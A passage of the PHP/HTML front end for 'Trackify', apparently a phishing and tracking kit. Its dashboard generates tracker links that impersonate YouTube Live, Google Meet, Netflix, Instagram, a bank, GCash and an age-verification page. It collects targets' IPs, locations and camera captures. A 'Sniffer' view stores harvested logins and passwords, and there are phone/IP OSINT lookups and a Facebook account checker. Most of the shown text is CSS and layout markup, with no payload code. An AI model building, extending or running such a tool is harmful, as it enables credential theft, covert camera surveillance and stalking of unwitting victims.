            border: 1px solid rgba(248, 81, 73, 0.45);
            background: rgba(248, 81, 73, 0.12);
            color: #ffb1ab;
            font-family: inherit;
            font-size: 13px;
            font-weight: 500;
            line-height: 1;
            cursor: pointer;
            transition: background 0.15s, border-color 0.15s;
            white-space: nowrap;
            -webkit-appearance: none;
            appearance: none;
            vertical-align: top;
        }
        .fb-monitor-bulk-delete-btn:hover {
            background: rgba(248, 81, 73, 0.2);
            border-color: rgba(248, 81, 73, 0.55);
        }
        .fb-monitor-bulk-delete-btn svg {
            flex-shrink: 0;
        }
        .fb-monitor-bulk-count {
            font-weight: 600;
            color: #ff8a80;
        }
        .fb-monitor-refresh-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin: 0;
            padding: 0 14px;
            height: 42px;
            min-height: 42px;
            max-height: 42px;
            box-sizing: border-box;
            border-radius: 8px;
            border: 1px solid var(--border);
            background: rgba(88, 166, 255, 0.08);
            color: var(--text);
            font-family: inherit;
            font-size: 13px;
            font-weight: 500;
            line-height: 1;
            cursor: pointer;
            transition: background 0.15s, border-color 0.15s;
            white-space: nowrap;
            -webkit-appearance: none;
            appearance: none;
            vertical-align: top;
        }
        .fb-monitor-refresh-btn:hover:not(:disabled) {
            background: rgba(88, 166, 255, 0.14);
            border-color: rgba(88, 166, 255, 0.35);
        }
        .fb-monitor-refresh-btn:disabled {
            opacity: 0.65;
            cursor: not-allowed;
        }
        .fb-monitor-refresh-btn svg {
            flex-shrink: 0;
        }
        .fb-monitor-search-wrap {
            min-width: 0;
            height: 42px;
            min-height: 42px;
            max-height: 42px;
            box-sizing: border-box;
            display: flex;
            align-items: center;
            gap: 10px;
            background: var(--bg-input);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 0 12px;
        }
        .fb-monitor-search-wrap:focus-within {
            border-color: var(--accent);
            box-shadow: 0 0 0 1px rgba(88, 166, 255, 0.25);
        }
        .fb-monitor-search-icon {
            opacity: 0.65;
            font-size: 14px;
            user-select: none;
        }
        .fb-monitor-search-wrap input[type="search"] {
            flex: 1;
            min-width: 0;
            border: none;
            background: transparent;
            color: var(--text);
            font-size: 14px;
            padding: 0;
            margin: 0;
            min-height: 0;
            line-height: 1.35;
            box-shadow: none;
            font-family: inherit;
            outline: none;
        }
        .fb-monitor-search-wrap input[type="search"]:focus {
            box-shadow: none;
            border: none;
        }
        .fb-monitor-table-card {
            margin-top: 16px;
        }
        .fb-monitor-table-title {
            font-size: 13px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 10px;
        }
        .fb-monitor-col-check {
            width: 2.5rem;
            text-align: center;
            vertical-align: middle;
        }
        .fb-monitor-col-check input[type="checkbox"],
        .fb-monitor-row-cb {
            width: 16px;
            height: 16px;
            cursor: pointer;
            accent-color: var(--accent);
        }
        .fb-monitor-pagination {
            margin-top: 12px;
        }
        .fb-monitor-pagination-inner {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
            gap: 10px 16px;
            font-size: 13px;
            color: var(--text-muted);
        }
        .fb-monitor-pagination-info {
            min-width: 0;
        }
        .fb-monitor-pagination-btns {
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .fb-monitor-pagination-page {
            font-size: 12px;
            color: var(--text-muted);
            white-space: nowrap;
        }
        .fb-monitor-pagination-btns .btn {
            padding: 6px 12px;
            font-size: 13px;
        }
        .fb-monitor-log-terminal {
            margin: 0;
            padding: 16px 18px 18px;
            background: linear-gradient(180deg, #0a0e14 0%, #070a10 100%);
            box-shadow: inset 0 0 0 1px rgba(88, 166, 255, 0.06);
            max-height: min(340px, 42vh);
            overflow: auto;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12.5px;
            line-height: 1.55;
        }
        .fb-monitor-log-line {
            margin: 0 0 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(48, 54, 61, 0.45);
        }
        .fb-monitor-log-line:last-child {
            margin-bottom: 0;
            padding-bottom: 0;
            border-bottom: none;
        }
        .fb-monitor-log-meta {
            display: block;
            font-size: 10px;
            color: #626a73;
            margin-bottom: 4px;
            letter-spacing: 0.02em;
        }
        .fb-monitor-log-status {
            font-weight: 700;
        }
        .fb-monitor-log-detail {
            color: #9da7b3;
            font-weight: 400;
        }
        .fb-monitor-log-empty {
            margin: 0;
            color: #626a73;
            font-size: 12px;
            line-height: 1.5;
        }
        .fb-monitor-modal-fields .phone-lookup-input-wrap {
            margin-bottom: 14px;
        }
        .fb-monitor-modal-fields .phone-lookup-input-wrap:last-of-type {
            margin-bottom: 0;
        }
        .fb-monitor-modal-actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        .fb-monitor-modal-actions .btn {
            flex: 1;
        }
        .fb-monitor-action-cell {
            white-space: nowrap;
            vertical-align: middle;
        }
        .fb-monitor-action-btns {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }
        .fb-monitor-check-btn,
        .fb-monitor-remove-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            font-size: 12px;
            font-family: inherit;
            font-weight: 500;
            padding: 7px 12px;
            border-radius: 8px;
            cursor: pointer;
            border: 1px solid var(--border);
            transition: background 0.15s, border-color 0.15s, color 0.15s;
        }
        .fb-monitor-check-btn {
            background: rgba(88, 166, 255, 0.12);
            color: var(--text);
            border-color: rgba(88, 166, 255, 0.35);
        }
        .fb-monitor-check-btn:hover:not(:disabled) {
            background: rgba(88, 166, 255, 0.2);
            border-color: rgba(88, 166, 255, 0.55);
        }
        .fb-monitor-check-btn:disabled {
            cursor: not-allowed;
            opacity: 0.85;
        }
        .fb-monitor-check-btn svg {
            flex-shrink: 0;
        }
        .fb-monitor-check-btn .fb-monitor-check-idle,
        .fb-monitor-check-btn .fb-monitor-check-busy {
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .fb-monitor-check-btn .fb-monitor-check-busy {
            display: none;
        }
        .fb-monitor-check-btn.is-loading .fb-monitor-check-idle {
            display: none;
        }
        .fb-monitor-check-btn.is-loading .fb-monitor-check-busy {
            display: inline-flex;
        }
        .fb-monitor-spinner {
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-top-color: var(--accent);
            border-radius: 50%;
            animation: fb-monitor-spin 0.65s linear infinite;
        }
        @keyframes fb-monitor-spin {
            to { transform: rotate(360deg); }
        }
        .fb-monitor-remove-btn {
            background: rgba(248, 81, 73, 0.1);
            color: var(--accent-red);
            border-color: rgba(248, 81, 73, 0.45);
        }
        .fb-monitor-remove-btn:hover:not(:disabled) {
            color: #ff8a82;
            border-color: rgba(248, 81, 73, 0.75);
            background: rgba(248, 81, 73, 0.18);
        }
        .fb-monitor-remove-btn svg {
            flex-shrink: 0;
            opacity: 1;
        }
        .fb-monitor-logs-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            font-size: 12px;
            font-family: inherit;
            font-weight: 500;
            padding: 7px 12px;
            border-radius: 8px;
            cursor: pointer;
            border: 1px solid rgba(210, 153, 34, 0.45);
            background: rgba(210, 153, 34, 0.1);
            color: var(--accent-yellow);
            transition: background 0.15s, border-color 0.15s, color 0.15s;
        }
        .fb-monitor-logs-btn:hover:not(:disabled) {
            background: rgba(210, 153, 34, 0.2);
            border-color: rgba(210, 153, 34, 0.65);
            color: #e3c88c;
        }
        .fb-monitor-logs-btn svg {
            flex-shrink: 0;
            opacity: 0.95;
        }
        .fb-monitor-row-log-terminal {
            margin: 0;
        }
        .fb-monitor-status-cell {
            vertical-align: middle;
        }
        .fb-monitor-status-tag {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.05em;
            text-transform: uppercase;
            padding: 5px 11px;
            border-radius: 999px;
            border: 1px solid transparent;
            white-space: nowrap;
            line-height: 1.2;
        }
        .fb-monitor-status-tag--active {
            color: #9eea88;
            background: rgba(127, 217, 98, 0.14);
            border-color: rgba(127, 217, 98, 0.38);
        }
        .fb-monitor-status-tag--inactive {
            color: #ff9a96;
            background: rgba(248, 81, 73, 0.12);
            border-color: rgba(248, 81, 73, 0.42);
        }
        .fb-monitor-status-tag--unavailable {
            color: #ffc266;
            background: rgba(255, 180, 84, 0.12);
            border-color: rgba(255, 180, 84, 0.42);
        }
        .fb-monitor-status-tag--unknown {
            color: #8b949e;
            background: rgba(139, 148, 158, 0.12);
            border-color: rgba(139, 148, 158, 0.38);
        }
        .saved-info-col-time {
            min-width: 12.5rem;
        }
        .saved-info-col-login {
            min-width: 9rem;
            max-width: 18rem;
        }
        .saved-info-col-password {
            min-width: 9rem;
            max-width: 16rem;
        }
        .saved-info-col-template {
            min-width: 7rem;
            white-space: nowrap;
        }
        .saved-info-col-ip {
            min-width: 11rem;
            max-width: 20rem;
            font-size: 12px;
            word-break: break-all;
            overflow-wrap: anywhere;
        }
        .saved-info-col-ua {
            min-width: 14rem;
            max-width: 24rem;
            line-height: 1.45;
            word-break: normal;
            overflow-wrap: break-word;
        }
        .saved-info-cell-mono {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
        }
        .saved-info-cell-template {
            font-weight: 500;
            color: var(--text);
        }
        .saved-info-cell-time {
            white-space: nowrap;
            font-size: 13px;
            color: var(--text);
            font-family: inherit;
            font-weight: 500;
        }
        .saved-info-empty {
            color: var(--text-muted);
            padding: 28px 16px;
            text-align: center;
            font-size: 14px;
            line-height: 1.5;
            border: 1px dashed var(--border);
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.2);
        }
        .phone-layout-inner {
            max-width: 1680px;
            margin: 0 auto;
            width: 100%;
        }
        .phone-layout-columns {
            display: grid;
            grid-template-columns: minmax(0, 2fr) minmax(0, 1.3fr);
            gap: 28px;
            align-items: flex-start;
        }
        .phone-layout-columns--saveinfo {
            grid-template-columns: minmax(0, 1fr) minmax(420px, 1.35fr);
        }
        @media (max-width: 1100px) {
            .phone-layout-columns--saveinfo {
                grid-template-columns: minmax(0, 1fr) minmax(300px, 1.15fr);
            }
        }
        .phone-layout-columns > * {
            min-width: 0;
        }
        @media (max-width: 900px) {
            .phone-layout-columns {
                grid-template-columns: 1fr;
            }
        }
        @media (max-width: 820px) {
            #fbmonitorLayout.phone-layout {
                padding: 16px;
            }
            .phone-layout {
                padding: 16px;
            }
            .phone-layout-columns {
                gap: 16px;
            }
            .phone-layout .card {
                padding: 16px;
            }
            .phone-history-list {
                max-height: 320px;
            }
            .phone-lookup-terminal {
                font-size: 12.5px;
                overflow-x: auto;
                max-width: 100%;
            }
            .phone-lookup-terminal-line {
                word-break: break-word;
            }
            .phone-lookup-actions {
                flex-direction: column;
                align-items: stretch;
            }
            .phone-lookup-actions .btn {
                width: 100%;
            }
        }
        .phone-history-title {
            font-size: 14px;
            font-weight: 600;
            color: var(--text);
            margin-bottom: 8px;
        }
        .phone-history-list {
            border-radius: 10px;
            border: 1px solid var(--border);
            background: var(--bg-card);
            max-height: 260px;
            overflow-y: auto;
            font-size: 12px;
        }
        .phone-history-item {
            padding: 10px 12px;
            border-bottom: 1px solid rgba(48,54,61,0.7);
        }
        .phone-history-item:last-child {
            border-bottom: none;
        }
        .phone-history-number {
            color: var(--accent);
            font-weight: 600;
        }
        .phone-history-meta {
            color: var(--text-muted);
            margin-top: 2px;
            font-size: 11px;
        }
        .phone-history-urls {
            margin-top: 4px;
        }
        .phone-history-urls a {
            display: block;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            color: var(--accent);
            text-decoration: none;
        }
        .phone-history-urls a:hover {
            text-decoration: underline;
        }
        .ip-lookup-details {
            font-size: 13px;
        }
        .ip-lookup-grid {
            border: 1px solid var(--border);
            border-radius: 10px;
            overflow: hidden;
            background: var(--bg-input);
        }
        .ip-lookup-pair-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            border-bottom: 1px solid var(--border);
        }
        .ip-lookup-pair-row:last-child {
            border-bottom: none;
        }
        .ip-lookup-half {
            display: grid;
            grid-template-columns: minmax(100px, 38%) 1fr;
            gap: 10px 14px;
            padding: 12px 16px;
            align-items: baseline;
            border-right: 1px solid var(--border);
        }
        .ip-lookup-half:last-child {
            border-right: none;
        }
        .ip-lookup-lbl {
            color: var(--text-muted);
            font-size: 13px;
            font-weight: 500;
        }
        .ip-lookup-val {
            color: var(--accent-green);
            font-size: 13px;
            font-weight: 600;
            word-break: break-word;
            font-family: 'JetBrains Mono', monospace;
        }
        .ip-lookup-extra {
            margin-top: 16px;
            padding-top: 14px;
            border-top: 1px solid var(--border);
        }
        .ip-lookup-extra h3 {
            font-size: 12px;
            font-weight: 600;
            color: var(--text-muted);
            margin: 0 0 10px 0;
            text-transform: uppercase;
            letter-spacing: 0.04em;
        }
        .ip-lookup-extra-row {
            display: grid;
            grid-template-columns: minmax(120px, 32%) 1fr;
            gap: 10px;
            padding: 8px 0;
            border-bottom: 1px solid rgba(48,54,61,0.5);
        }
        .ip-lookup-extra-row:last-child {
            border-bottom: none;
        }
        @media (max-width: 720px) {
            .ip-lookup-pair-row {
                grid-template-columns: 1fr;
            }
            .ip-lookup-half {
                border-right: none;
                border-bottom: 1px solid var(--border);
            }
            .ip-lookup-half:last-child {
                border-bottom: none;
            }
        }
        .ip-lookup-map {
            height: 380px;
            border-radius: 10px;
            border: 1px solid var(--border);
            overflow: hidden;
            background: var(--bg-input);
        }
        .ip-lookup-map.ip-lookup-map--empty {
            height: auto;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--text-muted);
            font-size: 13px;
            padding: 24px;
            text-align: center;
        }
        .top-nav {
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 24px;
            border-bottom: 1px solid var(--border);
            background: linear-gradient(90deg, rgba(13,17,23,0.98), rgba(13,17,23,0.9));
        }
        .top-nav-left {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .top-nav-hamburger {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            border: 1px solid rgba(48, 54, 61, 0.9);
            background: rgba(22, 27, 34, 0.65);
            color: var(--text);
            display: none;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background 0.15s, border-color 0.15s, transform 0.15s;
        }
        .top-nav-hamburger:hover {
            background: rgba(22, 27, 34, 0.9);
            border-color: rgba(88, 166, 255, 0.55);
            transform: translateY(-1px);
        }
        .top-nav-hamburger:focus-visible {
            outline: 2px solid var(--accent);
            outline-offset: 3px;
        }
        .side-nav-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.56);
            backdrop-filter: blur(2px);
            z-index: 999;
            display: none;
        }
        .side-nav-overlay.is-open {
            display: block;
        }
        @media (max-width: 820px) {
            .top-nav { padding: 0 14px; }
            .top-nav-left { gap: 10px; }
            .top-nav-hamburger { display: inline-flex; }
            .side-nav {
                position: fixed;
                top: 0;
                left: 0;
                width: min(280px, 88vw);
                height: 100vh;
                transform: translateX(-110%);
                transition: transform 0.18s ease;
                z-index: 1000;
                box-shadow: 0 18px 45px rgba(0,0,0,0.6);
            }
            .side-nav.is-open {
                transform: translateX(0);
            }
        }
    </style>
</head>
<body>
    <div class="app-shell">
        <nav class="side-nav" aria-label="Main navigation">
            <div class="side-nav-brand">
                <button type="button" class="side-nav-logo" onclick="switchView('trackify')" title="Trackify — Home" aria-label="Trackify — Home">
                    <img src="logos/trackify_logo.png" width="120" height="48" alt="">
                </button>
                <span class="side-nav-product">Trackify</span>
            </div>
            <div class="side-nav-section-label" role="presentation">Workspace</div>
            <button type="button" class="side-nav-item active" id="navItemTrackify" onclick="switchView('trackify')" title="Dashboard">
                <span class="side-nav-item-icon" aria-hidden="true">🛰</span>
                <span class="side-nav-item-label">Dashboard</span>
            </button>
            <button type="button" class="side-nav-item" id="navItemPhone" onclick="switchView('phone')" title="Phone lookup">
                <span class="side-nav-item-icon" aria-hidden="true">☎</span>
                <span class="side-nav-item-label">Phone lookup</span>
            </button>
            <button type="button" class="side-nav-item" id="navItemIp" onclick="switchView('ip')" title="IP lookup">
                <span class="side-nav-item-icon" aria-hidden="true">🌐</span>
                <span class="side-nav-item-label">IP lookup</span>
            </button>
            <button type="button" class="side-nav-item" id="navItemSaveInfo" onclick="switchView('saveinfo')" title="Sniffer">
                <span class="side-nav-item-icon" aria-hidden="true">🔑</span>
                <span class="side-nav-item-label">Sniffer</span>
            </button>
            <button type="button" class="side-nav-item" id="navItemExiftool" onclick="switchView('exiftool')" title="EXIF tool">
                <span class="side-nav-item-icon" aria-hidden="true">📷</span>
                <span class="side-nav-item-label">EXIF tool</span>
            </button>
            <div class="side-nav-group" id="sideNavGroupFbTools">
                <button type="button" class="side-nav-group-toggle" id="sideNavFbToolsToggle" onclick="toggleFbToolsNav()" aria-expanded="true" aria-controls="sideNavFbToolsSubmenu">
                    <span class="side-nav-item-icon side-nav-item-icon--fb" aria-hidden="true">
                        <svg class="side-nav-fb-logo" width="22" height="22" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
                            <path fill="#1877F2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                        </svg>
                    </span>
                    <span class="side-nav-item-label">Facebook Tools</span>
                    <span class="side-nav-group-chevron" aria-hidden="true">▾</span>
                </button>
                <div class="side-nav-submenu" id="sideNavFbToolsSubmenu" role="group" aria-label="Facebook Tools">
                    <button type="button" class="side-nav-item side-nav-item--sub" id="navItemAccountChecker" onclick="switchView('fbmonitor')" title="Account Checker">
                        <span class="side-nav-item-icon" aria-hidden="true">👁</span>
                        <span class="side-nav-item-label">Account Checker</span>
                    </button>
                </div>
            </div>
            <div class="side-nav-spacer" aria-hidden="true"></div>
            <div class="side-nav-section-label" role="presentation">Account</div>
            <a href="account-settings.php" class="side-nav-item" title="Settings">
                <span class="side-nav-item-icon" aria-hidden="true">⚙</span>
                <span class="side-nav-item-label">Settings</span>
            </a>
            <div class="side-nav-disclaimer-wrap">
                <button type="button" class="side-nav-item" onclick="openDisclaimer()" title="Disclaimer">
                    <span class="side-nav-item-icon" aria-hidden="true">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01"/></svg>
                    </span>
                    <span class="side-nav-item-label">Disclaimer</span>
                </button>
            </div>
        </nav>
        <div class="side-nav-overlay" id="sideNavOverlay" aria-hidden="true"></div>

        <div style="flex:1;display:flex;flex-direction:column;min-height:100vh;">
            <header class="top-nav">
                <div class="top-nav-left">
                    <button type="button" class="top-nav-hamburger" id="sideNavToggle" aria-label="Open menu" aria-controls="sideNavOverlay" aria-expanded="false">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
                            <path d="M4 6h16M4 12h16M4 18h16"/>
                        </svg>
                    </button>
                </div>
                <div class="user-nav" id="userNav">
                    <button type="button" class="user-nav-trigger" id="userNavTrigger" aria-expanded="false" aria-haspopup="true" aria-controls="userNavMenu">
                        <span class="user-nav-avatar" aria-hidden="true"><?= h($userNavInitial) ?></span>
                        <span class="user-nav-name"><?= h($userNavName) ?></span>
                        <svg class="user-nav-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 9l6 6 6-6"/></svg>
                    </button>
                    <div class="user-nav-dropdown" id="userNavMenu" role="menu" hidden>
                        <a href="account-settings.php" class="user-nav-item" role="menuitem">Account settings</a>
                        <a href="logout.php" class="user-nav-item user-nav-item--danger" role="menuitem">Log out</a>
                    </div>
                </div>
            </header>

        <div id="trackifyLayout" class="layout">
        <main class="main">
            <div class="card">
                <h2>Generate Tracker Link</h2>
                <p class="subtitle card-view-desc">Trackify is a tracker-link platform with advanced analytics for traffic through your generated URLs—see IPs, locations, camera captures, and live events as visitors move through your pages.</p>
                <label>Template</label>
                <select id="template">
                    <option value="1">YouTube Live</option>
                    <option value="2" selected>Google Meet</option>
                    <option value="3">Sensitive (Age Verification)</option>
                    <option value="4">Netflix</option>
                    <option value="5">Instagram</option>
                    <option value="6">Bank</option>
                    <option value="7">GCash</option>
                </select>
                <div id="ytVideoIdWrap" style="display:none">
                    <label>YouTube Video ID</label>
                    <input type="text" id="ytVideoId" placeholder="dQw4w9WgXcQ" value="dQw4w9WgXcQ">
                </div>
                <button type="button" class="btn btn-primary btn-generate" id="generateBtn" onclick="generateLink()">
                    <svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                    <span>Generate</span>
                </button>
                <div id="tunnelControlsWrap" class="tunnel-controls-wrap" style="display:none">
                    <div id="linkBox" class="link-box">
                        <div id="trackerLinkGroup" class="tunnel-link-group">
                            <input type="text" class="link-input" id="trackerLink" readonly>
                            <button type="button" class="btn btn-secondary" onclick="copyLink()">Copy</button>
                        </div>
                        <button type="button" class="btn btn-danger" id="stopBtn" onclick="stopService()" style="display:none">Stop tunnel</button>
                    </div>
                </div>
            </div>

            <div class="card card-terminal-panel">
                <div class="terminal-card-head">
                    <h2>Terminal</h2>
                    <span class="terminal-card-badge" aria-hidden="true">Live</span>
                </div>
                <div class="phone-lookup-terminal" id="terminal">
                    <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Waiting for targets, Press Ctrl + C to exit...</div>
                    <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>
                </div>
            </div>
        </main>

        <section class="gallery-section">
            <div class="card gallery-panel-head">
                <div class="gallery-header-top">
                    <h2 class="gallery-title">Image Captures</h2>
                    <span id="photoCount" style="font-size:13px;color:var(--text-muted)"></span>
                </div>
                <div class="gallery-toolbar" id="galleryToolbar">
                    <label class="gallery-toolbar-label">
                        <input type="checkbox" id="gallerySelectAll" title="Select all on this page">
                        Select page
                    </label>
                    <button type="button" class="gallery-btn danger" id="galleryBulkDelete" disabled>Delete selected</button>
                </div>
                <div id="captureQuotaBanner" class="capture-quota-banner" style="display:none" role="status" aria-live="polite"></div>
            </div>
            <div id="galleryGrid" class="gallery-grid">
                <div class="gallery-empty" id="galleryEmpty">
                    <div class="gallery-empty-icon">📷</div>
                    <div class="gallery-empty-title">No captures yet</div>
                    <div class="gallery-empty-text">Camera captures will appear here when targets complete verification.</div>
                    <div class="gallery-empty-hint">Generate a link and share it to start capturing</div>
                </div>
            </div>
            <div id="pagination" class="pagination" style="display:none">
                <button class="pagination-btn" id="prevBtn" onclick="loadPhotos(currentPage - 1)">← Prev</button>
                <span class="pagination-info" id="paginationInfo">Page 1 of 1</span>
                <button class="pagination-btn" id="nextBtn" onclick="loadPhotos(currentPage + 1)">Next →</button>
            </div>
        </section>

        <aside class="sidebar">
            <div class="card trackify-only">
                <h2>Status</h2>
                <div id="statusDisplay">
                    <span class="status-badge inactive">Tunnel inactive</span>
                </div>
                <p id="statusLink" style="margin-top:12px;font-size:12px;color:var(--text-muted);word-break:break-all"></p>
                <button class="btn btn-danger" id="stopBtnSidebar" onclick="stopService()" style="display:none;width:100%;margin-top:12px">Stop Tunnel</button>
            </div>
            <div class="card trackify-only">
                <div class="card-header-row">
                    <h2>Recent Captures</h2>
                    <button type="button" class="mini-btn" id="clearCapturesBtn" onclick="clearCaptures()">Clear Captures</button>
                </div>
                <div id="capturesList" class="captures-list">
                    <div class="empty-state">No captures yet</div>
                </div>
            </div>
            <div class="card trackify-only">
                <h2>Quick Links</h2>
                <a href="map.php" target="_blank" class="btn btn-secondary" style="width:100%;justify-content:center;text-decoration:none;margin-bottom:8px">View Map</a>
                <a href="api.php?action=captures" target="_blank" class="btn btn-secondary" style="width:100%;justify-content:center;text-decoration:none">API (JSON)</a>
            </div>
        </aside>
        </div>

        <section id="phoneLayout" class="phone-layout" aria-label="Phone number lookup view">
            <div class="phone-layout-inner">
                <div class="phone-layout-columns">
                    <div class="card">
                        <h2>Phone Number Lookup</h2>
                        <p class="subtitle card-view-desc">Phone Lookup is a recon assistant with advanced shortcuts for numbers you investigate—turn a single input into OSINT URLs, social search links, and a scan history you can revisit anytime.</p>
                        <div class="phone-lookup-input-wrap">
                            <label for="phoneLookupInput">Phone number</label>
                            <input type="text" id="phoneLookupInput" placeholder="09XXXXXXXXX or +63XXXXXXXXXX">
                        </div>
                        <div id="phoneLookupError" class="phone-lookup-error" role="alert" hidden></div>
                        <div class="phone-lookup-actions">
                            <button class="btn btn-secondary" type="button" onclick="performPhoneLookup()">Scan</button>
                        </div>
                        <div id="phoneLookupResults" class="phone-lookup-results" aria-live="polite">
                            <div class="phone-lookup-terminal">
                                <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Enter a phone number on the left and press <span class="link">Scan</span> to generate OSINT URLs.</div>
                                <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>
                            </div>
                        </div>
                    </div>
                    <div class="phone-history">
                        <div class="phone-history-title">Scan History</div>
                        <div id="phoneHistoryList" class="phone-history-list">
                            <div class="phone-history-item">
                                <div class="phone-history-meta">No scans yet. Run your first lookup to populate history.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section id="ipLayout" class="phone-layout" style="display:none" aria-label="IP lookup view">
            <div class="phone-layout-inner">
                <div class="phone-layout-columns">
                    <div class="card">
                        <h2>IP Lookup</h2>
                        <p class="subtitle card-view-desc">IP Lookup is a network intelligence view with advanced analytics for addresses you query—IPv4 or IPv6 geolocation, provider details, and an optional map when coordinates are returned.</p>
                        <div class="phone-lookup-input-wrap">
                            <label for="ipLookupInput">IP address</label>
                            <input type="text" id="ipLookupInput" placeholder="e.g. 8.8.8.8 or 2001:4860:4860::8888" autocomplete="off">
                        </div>
                        <div id="ipLookupError" class="phone-lookup-error" role="alert" hidden></div>
                        <div class="phone-lookup-actions">
                            <button type="button" class="btn btn-secondary" onclick="performIpLookup()">Lookup</button>
                        </div>
                        <div id="ipLookupTerminal" class="phone-lookup-results" aria-live="polite">
                            <div class="phone-lookup-terminal">
                                <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Enter an IPv4 or IPv6 address and press <span class="link">Lookup</span>.</div>
                                <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>
                            </div>
                        </div>
                    </div>
                    <div>
                        <div class="card">
                            <h2>Details</h2>
                            <div id="ipLookupDetails" class="ip-lookup-details">
                                <p style="margin:0;color:var(--text-muted);font-size:13px">Run a lookup to see IP details.</p>
                            </div>
                        </div>
                        <div class="card" style="margin-top:20px">
                            <h2>Map</h2>
                            <div id="ipLookupMap" class="ip-lookup-map ip-lookup-map--empty">No location yet. Coordinates appear here when FindIP returns latitude/longitude.</div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <section id="exiftoolLayout" class="phone-layout" style="display:none" aria-label="EXIFTool viewer">
            <div class="phone-layout-inner">
                <div class="phone-layout-columns">
                    <div>
                        <div class="card">
                            <h2>EXIFTool Viewer</h2>
                            <p class="subtitle card-view-desc">Upload an image and extract the complete EXIF/metadata (grouped) using EXIFTool.</p>
                            <div class="phone-lookup-input-wrap">
                                <label for="exiftoolFile">Image file</label>
                                <input type="file" id="exiftoolFile" accept="image/*">
                            </div>
                            <div id="exiftoolError" class="phone-lookup-error" role="alert" hidden></div>
                            <div class="phone-lookup-actions">
                                <button class="btn btn-secondary" type="button" id="exiftoolExtractBtn" onclick="exiftoolExtract()">Extract</button>
                            </div>
                            <div class="phone-lookup-results" aria-live="polite">
                                <div class="phone-lookup-terminal" id="exiftoolTerminal">
                                    <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Choose an image and press <span class="link">Extract</span> to view metadata.</div>
                                    <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:exif# </span><span class="terminal-cursor"></span></div>
                                </div>
                            </div>
                        </div>
                        <div class="card">
                            <h2>Results</h2>
                            <div style="display:flex;gap:10px;align-items:stretch;flex-wrap:wrap">
                                <input type="text" id="exiftoolFilter" placeholder="Filter tags (GPS, Make, Lens, DateTimeOriginal…)" style="flex:1;min-width:240px;height:44px;margin:0;padding:0 14px;background:var(--bg-input);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:14px;font-family:inherit;line-height:44px" autocomplete="off" oninput="exiftoolApplyFilter()">
                                <button class="btn btn-secondary" type="button" onclick="exiftoolCopyJson()" style="height:44px;margin:0">Copy JSON</button>
                            </div>
                            <div id="exiftoolTableWrap" style="margin-top:14px;display:none;max-height:420px;overflow:auto;border:1px solid var(--border);border-radius:12px">
                                <table style="width:100%;border-collapse:collapse">
                                    <thead>
                                        <tr>
                                            <th style="text-align:left;padding:10px 12px;border-bottom:1px solid var(--border);color:var(--text-muted);font-size:12px">Tag</th>
                                            <th style="text-align:left;padding:10px 12px;border-bottom:1px solid var(--border);color:var(--text-muted);font-size:12px">Value</th>
                                        </tr>
                                    </thead>
                                    <tbody id="exiftoolTbody"></tbody>
                                </table>
                            </div>
                            <p id="exiftoolEmpty" style="margin-top:12px;color:var(--text-muted);font-size:13px">Run an extract to see a filterable tag list.</p>
                        </div>
                    </div>
